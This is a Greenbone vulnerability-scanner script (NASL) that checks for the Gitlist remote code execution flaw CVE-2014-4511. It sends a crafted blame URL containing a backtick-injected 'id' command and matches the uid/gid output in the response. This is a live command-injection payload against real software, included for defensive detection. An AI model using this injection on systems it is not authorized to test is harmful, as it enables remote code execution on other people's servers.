# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105052");
  script_cve_id("CVE-2014-4511");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("2024-06-28T05:05:33+0000");
  script_name("Gitlist RCE Vulnerability");
  script_xref(name:"URL", value:"http://hatriot.github.io/blog/2014/06/29/gitlist-rce/");
  script_tag(name:"last_modification", value:"2024-06-28 05:05:33 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2014-06-30 13:00:23 +0200 (Mon, 30 Jun 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successfully exploiting this issue allows attackers to execute
arbitrary code in the context of the affected application.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP GET request and check the response.");

  script_tag(name:"insight", value:"An anonymous user could execute commands because of a
complete lack of input sanitizatioin");

  script_tag(name:"solution", value:"Update to Gitlist >= 0.5.0");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"Gitlist is prone to a remote code execution (RCE) vulnerability.");

  script_tag(name:"affected", value:"Gitlist <= 0.4.0");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );

foreach dir( make_list_unique( "/gitlist", "/git", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/";
  buf = http_get_cache( item:url, port:port );

  if( egrep( pattern:"Powered by.*GitList", string:buf ) ) {
    repos = eregmatch( pattern:'class="icon-folder-open icon-spaced"></i> <a href="([^"]+)">', string:buf );
    if( isnull( repos[1] ) ) continue;

    repo = repos[1];

    url = repo + 'blame/master/""</%60id%60';
    req = http_get( item:url, port:port );
    buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    if( buf =~ "uid=[0-9]+.*gid=[0-9]+" ) {
      req_resp = 'Request:\n' + req + '\nResponse:\n' + buf;
      security_message( port:port, expert_info:req_resp );
      exit( 0 );
    }
  }
}

exit( 99 );
